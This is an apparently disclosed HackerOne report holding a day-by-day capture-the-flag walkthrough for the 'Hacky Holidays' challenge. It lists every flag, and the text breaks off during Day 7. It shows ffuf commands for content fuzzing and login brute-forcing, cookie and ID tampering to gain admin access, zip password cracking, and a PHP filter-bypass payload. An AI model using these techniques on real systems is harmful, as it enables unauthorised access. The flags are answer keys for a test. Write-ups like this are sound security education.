{"id":1065495,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDY1NDk1","url":"https://hackerone.com/reports/1065495","title":"Solution for hackyholiday","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2020-12-23T21:40:02.883Z","submitted_at":"2020-12-23T21:40:02.893Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"holme","url":"/holme","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/oR64NYD1B7YVuyr3QEbru7tp/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":46757,"url":"https://hackerone.com/h1-ctf","handle":"h1-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"h1-ctf","twitter_handle":"Hacker0x01","website":"","about":"todayisnew reached 100K rep. Let's celebrate with a CTF!"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2021-01-12T21:05:43.543Z","bug_reporter_agreed_on_going_public_at":"2021-01-12T21:05:43.464Z","team_member_agreed_on_going_public_at":"2021-01-12T17:54:44.550Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\nSince there is a reward for the first 10 submissions, I'll start by providing the flags:\n\n```\nflag{48104912-28b0-494a-9995-a203d1e261e7}\nflag{b7ebcb75-9100-4f91-8454-cfb9574459f7}\nflag{b705fb11-fb55-442f-847f-0931be82ed9a}\nflag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}\nflag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}\nflag{18b130a7-3a79-4c70-b73b-7f23fa95d395}\nflag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}\nflag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}\nflag{6e8a2df4-5b14-400f-a85a-08a260b59135}\nflag{99309f0f-1752-44a5-af1e-a03e4150757d}\nflag{07a03135-9778-4dee-a83c-7ec330728e72}\nflag{ba6586b0-e482-41e6-9a68-caf9941b48a0}\n```\n\n## Impact\n\nThanks for the fun challenges and hacky hollidays!\nholme","bounty_amount":"500.0","formatted_bounty":"$500","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2021-02-11T17:54:44.663Z","allow_singular_disclosure_after":-20892380.05414389,"singular_disclosure_allowed":true,"vote_count":13,"voters":["pudsec","ali","d3f4u17","trieulieuf9","shivammusic","al__sfyani","efradev","sazuski","msthsri","ghani786","and 3 more..."],"structured_scope":{"databaseId":59882,"asset_type":"URL","asset_identifier":"hackyholidays.h1ctf.com","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":10244941,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"{F1139915}\n\n## Day 1\n\nThe time has finally come! It's the first day of the 12 hacky holidays and we can finally begin to infiltrate the Grinch Networks and save this year's Christmas.\n\nShivering with excitement I navigated to `hackyholidays.h1ctf.com` to be met with the following screen:\n\n{F1139719}\n\nAs we are insanely 1337 hackers we know we need to fire up our Very Cool Advanced Information Gathering And Also Some Other Cool Words System TM to infiltrate our target system... Or maybe we should just try and navigate to `/robots.txt`?\n\n{F1139718}\n\nWell, that does it this time! We successfully found the first flag! We also got a lead on how to continue tomorrow: `/s3cr3t-ar3a`. Stay tuned to see how it goes!\n\n`flag{48104912-28b0-494a-9995-a203d1e261e7}`\n\n## Day 2\n\nTime for another challenge! Let's check out `/s3cr3t-ar3a`:\n\n{F1139720}\n\nOrdinary people might accept that there's nothing to do, but we're not just anyone, we're 1337 hackers! Let's pop up our beloved developer tools and investigate the source of the page:\n\n{F1139721}\n\nYay! We successfully found the 2nd flag and have been pointed towards tomorrow's challenge: `/apps`\n\n`flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}`\n\n## Day 3\n\n3rd day, 3rd challenge, let's begin! Navigating to `/apps` we can see that a new challenge, 'People Rate' has been added:\n\n{F1139722}\n\nLet's start the challenge. The challenge is located on `/people-rater` and appears to be an app that returns the rating of a list of people when clicking on them. Firing up Burp Suite and clicking the very first name, we notice that a `GET` request is sent to `/people-rater/entry?id=eyJpZCI6Mn0=`. The `GET` parameter `id` seems interesting. The value seems to be Base64 encoded. Let's try to decode it and see if our assumption is correct.\n\n{F1139723}\n\nIndeed, it was correct! We get a JSON with a parameter called `id`. Interestingly enough, the value of the `id` parameter is '2' even though we picked the very first name. Let's try to create our own Base64 encoded JSON object in the same format, but with the value '1' instead:\n\n```\n{\"id\":1} -\u003e eyJpZCI6MX0=\n```\n\nLet's now try to use our own tampered value in the `GET` request, making it: `/people-rater/entry?id=eyJpZCI6MX0=`. The request is successful and gives us the following response body:\n\n```JSON\n{\n    \"id\":\"eyJpZCI6MX0=\",\n    \"name\":\"The Grinch\",\n    \"rating\":\"Amazing in every possible way!\",\n    \"flag\":\"flag{b705fb11-fb55-442f-847f-0931be82ed9a}\"\n}\n```\n\nWe successfully got the 3rd flag!\n\n`flag{b705fb11-fb55-442f-847f-0931be82ed9a}`\n\n## Day 4\n\nA new day has come and it's time for the next challenge. Browsing to `/apps`, we notice a new challenge has been added: 'Swag Shop'. Let's fire up the challenge and see what we're dealing with.\n\nThe challenge appears to be a shop (what a surprise), but there's not much to do, since we're quickly faced with a login form, which doesn't seem easy to bypass. Let's instead think a bit more like a 1337 hacker and do some recon. Let's use FFUF to do some web content discovery. Now we need to pick a good wordlist. Daniel Miessler's 'common.txt' for web content seems like a good start:\n\n```\nffuf -w common_webcontent.txt -t 5 -u \"https://hackyholidays.h1ctf.com/swag-shop/FUZZ\"\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.2.0-git\n________________________________________________\n\n :: Method           : GET\n :: URL              : https://hackyholidays.h1ctf.com/swag-shop/FUZZ\n :: Wordlist         : FUZZ: common_webcontent.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 5\n :: Matcher          : Response status: 200,204,301,302,307,401,403\n________________________________________________\n\napi                     [Status: 200, Size: 23, Words: 2, Lines: 1]00:16] :: Errors: 0 ::\n:: Progress: [4661/4661] :: Job [1/1] :: 41 req/sec :: Duration: [0:01:57] :: Errors: 0 ::\n```\n\nNavigating to `/api` doesn't return anything interesting. Let's try to find some API endpoints. We fire up FFUF again, but this time to fuzz for API endpoints using Daniel Miessler's 'common-api-endpoints-mazen160.txt'. To be sure we don't miss anything, let's match all response codes except `404` by using the flags `-mc all -fc 404`\n\n```\nffuf -w common-api-endpoints-mazen160.txt -t 5 -u \"https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ\" -mc all -fc 404\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.2.0-git\n________________________________________________\n\n :: Method           : GET\n :: URL              : https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ\n :: Wordlist         : FUZZ: common-api-endpoints-mazen160.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 5\n :: Matcher          : Response status: all\n :: Filter           : Response status: 404\n________________________________________________\n\nsessions                [Status: 200, Size: 2194, Words: 1, Lines: 1]03] :: Errors: 0 ::\nuser                    [Status: 400, Size: 35, Words: 3, Lines: 1]0:04] :: Errors: 0 ::\n:: Progress: [174/174] :: Job [1/1] :: 41 req/sec :: Duration: [0:00:05] :: Errors: 0 ::\n```\n\nWe discovered two endpoints: `/api/user` and `/api/sessions`! Let's start by checking `/api/user`. A simple `GET` request returns the following response:\n\n```JSON\nHTTP/1.1 400 Bad Request\nServer: nginx/1.18.0 (Ubuntu)\nDate: Tue, 29 Dec 2020 04:20:69 GMT\nContent-Type: application/json\nConnection: close\nContent-Length: 35\n\n{\n    \"error\":\"Missing required fields\"\n}\n```\n\nLooks like we're missing some parameter(s) in our request. Let's use FFUF once again to see if we can discover the missing parameter(s). Let's start by checking for `GET` parameters using Daniel Miessler's 'burp-parameter-names.txt'. Let's start by checking if any of the responses we get, doesn't contain the string: 'Missing required fields'. To do so, we can use the flag `-fr` to filter responses based on a regex:\n\n```\nffuf -w burp-parameter-names.txt -t 5 -u \"https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ\" -mc all -fr \"Missing required fields\"\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.2.0-git\n________________________________________________\n\n :: Method           : GET\n :: URL              : https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ\n :: Wordlist         : FUZZ: burp-parameter-names.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 5\n :: Matcher          : Response status: all\n :: Filter           : Regexp: Missing required fields\n________________________________________________\n\nuuid                    [Status: 404, Size: 40, Words: 5, Lines: 1]:00:33] :: Errors: 0 ::\n:: Progress: [2588/2588] :: Job [1/1] :: 40 req/sec :: Duration: [0:01:03] :: Errors: 0 ::\n```\n\nWe got a hit for 'uuid'! Now we just need a value for the parameter...\n\nLet's move on to the second API endpoint we discovered, `/api/sessions`. A simple `GET` request returns this interesting response body:\n\n```JSON\n{\n    \"sessions\":[\n        \"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=\",\n        \"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=\",\n        \"eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==\",\n        \"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=\",\n        \"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=\",\n        \"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=\",\n        \"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=\",\n        \"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0=\"\n        ]\n}\n```\n\nLet's try and Base64 decode these interesting values:\n\n```JSON\n{\n    \"user\":null,\n    \"cookie\":\"YzVmNTJiYTNkOWFlYTY2YjA1ZTY1NDBlNmI0YmZjMmNmZGYzMzg1MWJkZDcyMzY0ZTFlYjdmNDY3NDkzNzIwMGNiZjNhMjQ3Y2RmY2E2N2FmMzdjM2I0ZWNlZTVkM2VkNzU3MTUwYjdkYzkyNWI4Y2I3ZWZiNjk2N2NjOTk0MjU=\"\n},\n{\n    \"user\":null,\n    \"cookie\":\"ZjM2MzNjM2JkZGUyMzVmMmY2ZjcxNjdlNDNmZjQwZTlmY2RhNjYxNWM5Y2Y1ZjY2ODU3NjkxMTQ2Nzk0ZmIxOWZhN2ZhZjg0Y2E5Nzk1NTQ2MzMzZTc0MWJlMzVhZDA0MDUwYmQ3NDlmZTE4MmNkMjMxMzU0MWRlMTJhNWYzOGQ=\"\n},\n{\n    \"user\":\"C7DCCE-0E0DAB-B20226-FC92EA-1B9043\",\n    \"cookie\":\"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY=\"\n},\n{\n    \"user\":null,\n    \"cookie\":\"MDRmYTBhN2FiNjY5MGFlOWFmYTE4ZjE2N2JjZmYzZWJkOTRlOGYwMjI1OGIyNjM1ODU0Njc2YTdlZTM4MzFiM2I1MTUzMzViMjFhYzVkMTc4ODE3OGM4Y2JlOTk4MjJlMDI2YjQzZDQxMGNmNTg1ODQxZjBmODBmZWQxZmE1YmE=\"\n},\n{\n    \"user\":null,\n    \"cookie\":\"M2Q2MDIzNDg5MWE0N2M3NDJmNTIyNGM3NWUxYWQ0NDRlZWI3MTg4MjI3ZGRkMTllZTM2ZDkxMGVlNWEwNmZiZWFkZjZhODg4MDY3ODlmZGRhYTM1Y2IyMGVhMjA1NjdiNDFjYzBhMWQ4NDU1MDc4NDE1YmI5YTJjODBkMjFmN2Y=\"\n},\n{\n    \"user\":null,\n    \"cookie\":\"MWY3MTAzMTBjZGY4ZGMwYjI3Zjk2ZmYzMWJlMWEyZTg1YzE0MmZlZjMwYmJjZmQ4ZTU0Y2YxYzVmZTM1N2Q1ODY2YjFkZmFiNmI5ZjI1M2M2MDViNjA0ZjFjNDVkNTQ4N2U2ODdiNTJlMmFiMTExODA4MjU2MzkxZWNhNjFkNmU=\"\n},\n{\n    \"user\":null,\n    \"cookie\":\"MDM4YzhiN2Q3MmY0YjU2M2FkZmFlNDMwMTI5MjEyODhlNGFkMmI5OTcyMDlkNTJhZTc4YjUxZjIzN2Q4NmRjNjg2NmU1MzVlOWEzOTE5NWYyOTcwNmJlZDIyNDgyMTA5ZDA1OTliMTYyNDczNjFkZmU0MTgxYWEwMDU1ZWNhNzQ=\"\n},\n{\n    \"user\":null,\n    \"cookie\":\"OGI3N2ExOGVjNzM1ZWVmNTk2ZjNkZjIwM2ZjYzdjMWNhODg4NDhhODRmNjI0NDRjZTdlZTg0ZTUwNzZmZDdkYTJjN2IyODY5YjcxZmI5ZGRiYTgzZjhiZDViOWZjMTVlZDgzMTBkNzNmODI0OTM5ZDM3Y2JjZmY4NzEyOGE3NTM=\"\n}\n```\n\nThe cookie values seem to be some Base64 encoded SHA-512 hashes but doesn't seems to be of any use. The most interesting part is the one 'user' value which isn't just 'null': `C7DCCE-0E0DAB-B20226-FC92EA-1B9043`. Maybe we could use this as the value for the parameter 'uuid' in the request to `/api/user`?\n\n```JSON\nHTTP/1.1 200 OK\nServer: nginx/1.18.0 (Ubuntu)\nDate: Tue, 29 Dec 2020 23:27:25 GMT\nContent-Type: application/json\nConnection: close\nContent-Length: 216\n\n{\n    \"uuid\":\"C7DCCE-0E0DAB-B20226-FC92EA-1B9043\",\n    \"username\":\"grinch\",\n    \"address\":{\n        \"line_1\":\"The Grinch\",\n        \"line_2\":\"The Cave\",\n        \"line_3\":\"Mount Crumpit\",\n        \"line_4\":\"Whoville\"\n    },\n    \"flag\":\"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}\"\n}\n```\n\nYes! We successfully got day 4's flag!\n\n`flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}`\n\n## Day 5\n\nIt's yet another beautiful Christmas day and time for yet another challenge. Today we're met with the challenge 'Secure Login'. Opening up the challenge we're simply faced with a login screen. When trying to login, a `POST` request is sent to `/secure-login` and we're faced with the following error:\n\n{F1139725}\n\nThe error 'Invalid Username' seems like an interesting message, since we can imagine that a valid username but valid password would yield a different error message, making it possible to start by brute-forcing the username and then take care of the password afterwards. With the name of the challenge in mind, this seems like a fairly good path to take. Let's start up our good friend FFUF and provide it with Daniel Miessler's '10-million-password-list-top-1000.txt'. We'll start by brute-forcing the username and use `-fr` again to filter out responses containing the standard response, 'Invalid Username':\n\n```\nffuf -w 10-million-password-list-top-1000.txt -t 5 -X POST -H \"Content-Type: application/x-www-form-urlencoded\" -d \"username=FUZZ\u0026password=bla\" -u \"https://hackyholidays.h1ctf.com/secure-login\" -fr \"Invalid Username\"\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.2.0-git\n________________________________________________\n\n :: Method           : POST\n :: URL              : https://hackyholidays.h1ctf.com/secure-login\n :: Wordlist         : FUZZ: 10-million-password-list-top-1000.txt\n :: Header           : Content-Type: application/x-www-form-urlencoded\n :: Data             : username=FUZZ\u0026password=bla\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 5\n :: Matcher          : Response status: 200,204,301,302,307,401,403\n :: Filter           : Regexp: Invalid Username\n________________________________________________\n\naccess                  [Status: 200, Size: 1724, Words: 464, Lines: 37] :: Errors: 0 ::\n:: Progress: [1000/1000] :: Job [1/1] :: 40 req/sec :: Duration: [0:00:25] :: Errors: 0 ::\n```\n\nBingo! We got a valid username: 'access'. Time to brute force the password, this time by filtering for responses containing our new error message, 'Invalid Password':\n\n```\nffuf -w 10-million-password-list-top-1000.txt -t 5 -X POST -H \"Content-Type: application/x-www-form-urlencoded\" -d \"username=access\u0026password=FUZZ\" -u \"https://hackyholidays.h1ctf.com/secure-login\" -fr \"Invalid Password\"\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.2.0-git\n________________________________________________\n\n :: Method           : POST\n :: URL              : https://hackyholidays.h1ctf.com/secure-login\n :: Wordlist         : FUZZ: 10-million-password-list-top-1000.txt\n :: Header           : Content-Type: application/x-www-form-urlencoded\n :: Data             : username=access\u0026password=FUZZ\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 5\n :: Matcher          : Response status: 200,204,301,302,307,401,403\n :: Filter           : Regexp: Invalid Password\n________________________________________________\n\ncomputer                [Status: 302, Size: 0, Words: 1, Lines: 1]00:01] :: Errors: 0 ::\n:: Progress: [1000/1000] :: Job [1/1] :: 36 req/sec :: Duration: [0:00:25] :: Errors: 0 ::\n```\n\nPerfect! We got the password: 'computer'. Let's pop in the credentials and get the flag:\n\n{F1139726}\n\nWell... We got a bit ahead of ourselves there. Let's check how we've been authenticated. We can see that a cookie called 'securelogin' has been set to the value: `eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0=`. Let's go ahead and Base64 decoded the value: `{\"cookie\":\"1b5e5f2c9d58a30af4e16a71a45d0172\",\"admin\":false}`. Since we're 1337 hackers, it seems very tempting to try and change the 'admin' parameter to `true` instead of `false`.\n\nLet's do as we did in day 3's challenge and tamper with the cookie to see if we get lucky:\n\n{F1139724}\n\nWhat a beatiful suprise! We've successfully become admin's and can now see the zip file 'my_secure_files_not_for_you.zip'. Let's just download it and extract it to get the flag.\n\n{F1139681}\n\nWell... Still a bit to fast. So while a password protected zip file wasn't exactly what we would hope for, it won't stop us! Let's try to use fcrackerzip with the infamous 'rockyou.txt' and see if we can crack the password to the zip file:\n\n{F1139873}\n\nAnd just like that, we got the password in a matter of seconds: 'hahahaha'! We can finally extract the zip file and open up 'flag.txt' to get the 5th flag!\n\n`flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}`\n\n## Day 6\n\nThe next challenge 'My Diary' has been added and we're asked to find a hidden upcoming event the grinch is planning. Starting up the challenge we see the following:\n\n{F1139682}\n\nWe can see some event's but the hidden event isn't listed (duh). The `GET` parameter 'template' seems interesting as both the name and value, 'entries.html', suggests it's used to specify some file to load. Providing something random as the value simply redirects us to `/my-diary/?template=entries.html` so there seems to be some validation going on before the specified file is attempted to be loaded. If only we could see what's going on behind the curtain... Wait, maybe we could just load 'index.php'? The following is thrown back at us when trying:\n\n```PHP\n\u003c?php\nif( isset($_GET[\"template\"])  ){\n    $page = $_GET[\"template\"];\n    //remove non allowed characters\n    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);\n    //protect admin.php from being read\n    $page = str_replace(\"admin.php\",\"\",$page);\n    //I've changed the admin file to secretadmin.php for more security!\n    $page = str_replace(\"secretadmin.php\",\"\",$page);\n    //check file exists\n    if( file_exists($page) ){\n       echo file_get_contents($page);\n    }else{\n        //redirect to home\n        header(\"Location: /my-diary/?template=entries.html\");\n        exit();\n    }\n}else{\n    //redirect to home\n    header(\"Location: /my-diary/?template=entries.html\");\n    exit();\n}\n```\n\nThat worked great! Now we know what's going on. It looks like the goal is to load the file 'secretadmin.php', but there's some filtering going on. Let's create an interactive PHP shell from the command line and use the following PHP function to do some testing:\n\n```PHP\nfunction test($page){\n    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);\n    $page = str_replace(\"admin.php\",\"\",$page);\n    $page = str_replace(\"secretadmin.php\",\"\",$page);\n    echo $page;\n}\n```\n\nNow we can simply call our function with some different values and see what we are left with after the filtering. Let's start by seeing if we can achieve to get the string 'admin.php' returned. Since the char combination 'admin.php' is removed from the input string using `str_replace()` we could try to split our desired target string, 'admin.php' in to two parts, eg: 'adm' and 'in.php'. We can then put the char combination 'admin.php' in between these two parts, since we know it'll be removed anyways, making our payload: `'adm'+'admin.ph'+'in.php' -\u003e admadmin.phpin.php`. Time to test:\n\n{F1139680}\n\nNice! Let's now move on to see if we can have the string 'secretadmin.php' returned. We can adopt the same idea from before, but we need to notice that the string 'secretadmin.php' also contains the string 'admin.php', which means that the 'admin.php' part will be removed before we get to the second use of `str_replace` which looks for 'secretadmin.php'. But what if we use something like the following:\n\n`'secretadm'+'secretadm'+'admin.php'+'in.php'+'in.php' -\u003e secretadmsecretadmadmin.phpin.phpin.php`\n\nAfter the first check, all occurences of 'admin.php' will be removed, leaving us with:\n\n`secretadmsecretadm[admin.php]in.phpin.php -\u003e secretadmsecretadmin.phpin.php`\n\nAnd after the second check, all occurences of 'secretadmin.php' will be removed, leaving us with:\n\n`secretadm[secretadmin.php]in.php -\u003e secretadmin.php`\n\nThat's exactly what we want! Our test function confirms that this works:\n\n{F1139683}\n\nTime to test our payload in the challenge:\n\n{F1139685}\n\nPerfect! We've successfully bypassed the filter, uncovered the Grinch's secret event and retrieved the 6th flag! 'Launch DDoS Against Santa's Workshop!'... that doesn't sound good... We better get to sleep so we're well rested to continue our quest to take down the Grinch Network and save Christmas!\n\n`flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}`\n\n## Day 7\n\nWell look at that. It's a new day and a new challenge has arrived: 'Hate Mail Generator'. The challenge is wrapped in a 'Hate Mail Generator' app which makes it possible to create mail templates. We can see a template has already been saved, called 'Guess What'.\n\n{F1139686}\n\nWe can see that some template engine is being used and two use cases can be seen in 'Guess What'.\n\n1. Variables such as 'name' which will be replaced by a value\n2. The inclusion of a template such as 'cbdj3_grinch_header.html' which will be replaced by the contents of 'cbdj3_grinch_header.html'\n\nClicking the 'preview' button we see this transformation in action:\n\n{F1139688}\n\nWe also have the option of creating our own template. Trying to save it, we get the following error:\n\n{F1139689}\n\nBut we're still able to preview our own templates. Let's try to create our own template and preview it. We notice that a `POST` request is sent to `/hate-mail-generator/new/preview`\n\n```JSON\nPOST /hate-mail-generator/new/preview HTTP/1.1\nHost: hackyholidays.h1ctf.com\nConnection: close\nContent-Length: 102\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: https://hackyholidays.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://hackyholidays.h1ctf.com/hate-mail-generator/new\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\n\npreview_markup=hihi\u0026preview_data={\"name\":\"Alice\",\"email\":\"alice@test.com\"}\n```\n\nThe request body contains two parameters: 'preview_markup', which is set to whatever we have typed in the body of our template and 'preview_data' which appears to provide a JSON object with the data used to generate our template. Let's try to provide our own JSON object:\n\n`{\"hihi\":\"blabla\"}`\n\nand see if we're now able to use 'hihi' as a variable:\n\n{F1139690}\n\nYup, that works. Let's note that down and move on.\n\nThe templates used (eg. 'cbdj3_grinch_header.html') seems interesting. I wonder where they are stored... Let's fire up FFUF with Daniel Miessler's 'common.txt' for web content and see if we discover something:\n\n```\nffuf -w common_webcontent.txt -t 5 -u \"https://hackyholidays.h1ctf.com/hate-mail-generator/FUZZ\"\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ 